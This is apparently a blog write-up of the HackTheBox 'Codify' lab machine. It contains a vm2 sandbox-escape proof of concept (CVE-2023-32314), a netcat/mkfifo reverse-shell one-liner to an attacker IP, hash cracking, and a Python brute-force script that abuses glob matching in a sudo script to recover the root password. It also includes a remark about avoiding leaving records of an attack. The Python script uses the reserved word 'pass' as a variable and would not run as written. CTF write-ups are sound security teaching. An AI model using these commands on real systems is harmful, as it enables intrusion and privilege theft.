---
title: Codify Writeup - HackTheBox
date: 2024-01-12
categories:
  - Writeups
  - HTB
tags:
  - Linux
  - HTB
  - CTF
  - Easy
img_path: /assets/img/commons/codify/
image: codify.png
---

Hello!

In this write-up, we will dive into the **HackTheBox** [**Codify**](https://app.hackthebox.com/machines/574) machine.
It is a **Linux** machine on which we will take advantage of **remote command execution** in a NodeJS sandbox, we will get a **reverse shell** and then, we will proceed to do a **privilege escalation** using **python scripting** in order to own the system.


Let's go!

## Active recognition
---

As a first step, we will execute the `ping` command to verify that the target machine is active.

```bash
> ping -c 1 10.10.11.239
PING 10.10.11.239 (10.10.11.239) 56(84) bytes of data.
64 bytes from 10.10.11.239: icmp_seq=1 ttl=63 time=118 ms

--- 10.10.11.239 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 118.172/118.172/118.172/0.000 ms
```

## Port scaning
---

Next, we run a scan with `nmap` to identify open ports on the target machine.

```bash
nmap -sT -Pn -vvv 10.10.11.239
```

![nmap](nmap.png)

As usual, ports 22 (SSH) and 80 (HTTP) are open, as well as ports 3000 (we assume it is the one in charge of running the application) and 5555 (syn-ack!?).

After the port enumeration, we access to the browser to see what's on the http server.

![home](home.png)


## Exploitation
---
We access to the **Try Now** section and we find a NodeJS sandbox. I guess we can run JavaScript code and, after some testing, I tried to use the `exec()` function, that allows us to execute bash commands through JavaScript.

Obviously, it doesn't work (it would be too easy). However, we can execute commands remotely by exploiting the vulnerability [**CVE-2023-32314**](https://www.cvedetails.com/cve/CVE-2023-32314/): [*vm2 Sandbox escape vulnerability*](https://github.com/advisories/GHSA-whpj-8f3w-67p5?source=post_page-----466a012c59ce--------------------------------).

Within the github referenced above, we found a PoC written in JavaScript that abuses the unexpected creation of a Host object based on the **Proxy** specification:

```js
const { VM } = require("vm2");
const vm = new VM();

const code = `
	const err = new Error();
	err.name = {
		toString: new Proxy(() => "",
		{
			apply(target, thiz, args) {
				const process = args.constructor.constructor("return process")();
				throw process.mainModule.require("child_process")
					.execSync("echo 'this is a test'").toString();
			},
		}),
	};
	try {
		err.stack;
	} catch (stdout) {
		stdout;
	}
`;

console.log(vm.run(code)); // This will execute the bash command echo 'this is a test'
```

Once we have verified that it works, we try to run the command: `ls -l`:

![rce](rce.png)

From here, we have two options:
1. Adding our SSH credentials to the **authorized_keys** file in `~/.ssh`
2. Obtaining a reverse shell by taking advantage of the RCE (Remote Command Execution)

In a real environment, we should discard the first option (so as not to leave a record of the attack) so I'm going to go with the second one.



## Information gathering
---
### Obtaining a Reverse Shell
As usual, we are going to open **netcat** to intercept the shell (using the command: `nc -lnvp 443`). To get it, let's execute in the sandbox the next command (using the JavaScript code we have seen before)

```bash
rm /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.113 443 >/tmp/f
```

 

![revshell](reverse_shell.png)

After accessing the shell I try to access `/home/joshua` but without success. I examine the folder `/var/www` and (in addition to the typical html, css and js folders) I find a folder called **contact**.

### Obtaining user credentials and user flag
Inside the **contact** folder, we find a file called **tickets.db**

![tickets](tickets_db.png)

We find the hashed password for user *joshua*. We use **JohnTheRipper** to get the password in plain text.

![john](john.png)

Now, we can access via SSH as the user *joshua* and get the **user.txt** flag.

## Privilege escalation
---
Now that we have user access to the system, let's look at how we can escalate privileges. We start by loking for which processes are running with superuser permissions and are also visible to our user.

![sudo-l](scale_1.png)

We can see that the user has root access to the **mysql-backup.sh** file. Let's see what it contains:

![mysql-backup.sh](scale_2_mysql_backup.png)


There is an error in the script. In bash, when you do a text comparison using `==`, if the right side of the equality does not use quotes, bash uses **pattern matching** instead of interpreting it as a string.

Taking advantage of this, I try to execute the script and when it asks me for the password I use `*`, result?

![scale3](scale_3.png)

Voilà, password confirmed!

We can take advantage of this to obtain the root password (by creating a small python script)

```python
import string
import subprocess

all = list(string.ascii_letters + string.digits)
pass = ""
found = False

while not found:
	for character in all:
		command = f"echo '{pass}{character}*' | sudo /opt/scripts/mysql-backup.sh"
		output = subprocess.run(command, shell=True, stdout=subprocess.PIPE,
			stderr=subprocess.PIPE, text=True).stdout

		if "Password confirmed!" in output:
			pass += character
			print(pass)
			break
		else:
			found = True
```

The execution of this script returns the following:

![root_passwd](root_password.png)

Once we obtain the root password, we can access the system as superuser. We have already compromised the whole system and (of course) we can now obtain the final flag of the challenge.

> H4Ppy H4ck1ng!
